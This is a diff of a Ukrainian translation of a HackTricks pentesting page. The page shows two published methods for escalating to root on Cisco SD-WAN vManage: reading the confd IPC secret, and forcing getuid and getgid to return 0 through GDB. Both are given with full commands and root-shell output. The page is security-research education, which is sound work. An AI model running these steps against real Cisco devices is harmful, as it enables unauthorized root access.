@@ -1,22 +1,25 @@
 # Cisco - vmanage
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Чи працюєте в **кібербезпецівій компанії**? Хочете побачити **рекламу вашої компанії на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи телеграм**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Шлях 1
+## Path 1
 
 (Приклад з [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Після деякого дослідження [документації](http://66.218.245.39/doc/html/rn03re18.html), пов'язаної з `confd` та різними бінарними файлами (доступними за обліковим записом на веб-сайті Cisco), ми виявили, що для аутентифікації IPC сокету використовується секрет, розташований в `/etc/confd/confd_ipc_secret`:
+Після невеликого дослідження деякої [документації](http://66.218.245.39/doc/html/rn03re18.html), пов'язаної з `confd` та різними бінарними файлами (доступними з обліковим записом на веб-сайті Cisco), ми виявили, що для автентифікації IPC сокета використовується секрет, розташований у `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
@@ -34,7 +37,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Таким чином, ми можемо безпосередньо викликати `/usr/bin/confd_cli_user` зі своїм набором аргументів. Однак це не доступно для перегляду з нашими поточними привілеями, тому нам потрібно отримати його з rootfs, скопіювати за допомогою scp, прочитати довідку та використовувати її для отримання оболонки:
+Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Тому ми можемо безпосередньо викликати `/usr/bin/confd_cli_user` з нашим власним набором аргументів. Однак вона недоступна для читання з нашими поточними привілеями, тому нам потрібно отримати її з rootfs і скопіювати за допомогою scp, прочитати довідку та використовувати її для отримання оболонки:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -52,13 +55,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Шлях 2
+## Path 2
 
 (Приклад з [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Блог¹ команди synacktiv описав елегантний спосіб отримання кореневої оболонки, але застереження полягає в тому, що для цього потрібно отримати копію `/usr/bin/confd_cli_user`, яка доступна лише для читання root. Я знайшов інший спосіб підняття прав до root без таких турбот.
+Блог¹ команди synacktiv описав елегантний спосіб отримати root shell, але є застереження: для цього потрібно отримати копію `/usr/bin/confd_cli_user`, яка доступна лише для читання root. Я знайшов інший спосіб підвищити привілеї до root без таких труднощів.
 
-Коли я розібрав бінарний файл `/usr/bin/confd_cli`, я помітив наступне:
+Коли я розібрав бінарний файл `/usr/bin/confd_cli`, я спостерігав наступне:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -87,20 +90,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Коли я запустив "ps aux", я помітив наступне (_примітка -g 100 -u 107_)
+Коли я запускаю “ps aux”, я спостерігав наступне (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Я гіпотезував, що програма "confd\_cli" передає ідентифікатор користувача та ідентифікатор групи, які вона зібрала від ввійшовшого користувача, до програми "cmdptywrapper".
+Я висунув гіпотезу, що програма “confd\_cli” передає ідентифікатор користувача та ідентифікатор групи, які вона отримала від увійшовшого користувача, до програми “cmdptywrapper”.
 
-Моя перша спроба була запустити "cmdptywrapper" безпосередньо та передати йому `-g 0 -u 0`, але вона не вдалася. Здається, що десь по дорозі був створений файловий дескриптор (-i 1015), і я не можу його підробити.
+Моя перша спроба полягала в тому, щоб запустити “cmdptywrapper” безпосередньо і передати їй `-g 0 -u 0`, але це не вдалося. Схоже, що десь на шляху був створений дескриптор файлу (-i 1015), і я не можу його підробити.
 
-Як зазначено в блозі synacktiv (останній приклад), програма `confd_cli` не підтримує аргумент командного рядка, але я можу вплинути на неї за допомогою відладчика, і, на щастя, GDB включений у систему.
+Як згадувалося в блозі synacktiv (останній приклад), програма `confd_cli` не підтримує аргументи командного рядка, але я можу вплинути на неї за допомогою налагоджувача, і на щастя, GDB включено в систему.
 
-Я створив сценарій GDB, де я змусив API `getuid` та `getgid` повертати 0. Оскільки у мене вже є привілеї "vmanage" через RCE десеріалізацію, у мене є дозвіл на читання `/etc/confd/confd_ipc_secret` безпосередньо.
+Я створив скрипт GDB, в якому я змусив API `getuid` і `getgid` повертати 0. Оскільки я вже маю привілей “vmanage” через десеріалізацію RCE, я маю дозвіл на безпосереднє читання `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
 ```
@@ -154,14 +157,17 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+{% hint style="success" %}
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-* Чи працюєте ви в **кібербезпеці компанії**? Хочете побачити вашу **компанію рекламовану на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Відкрийте [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
+{% endhint %}
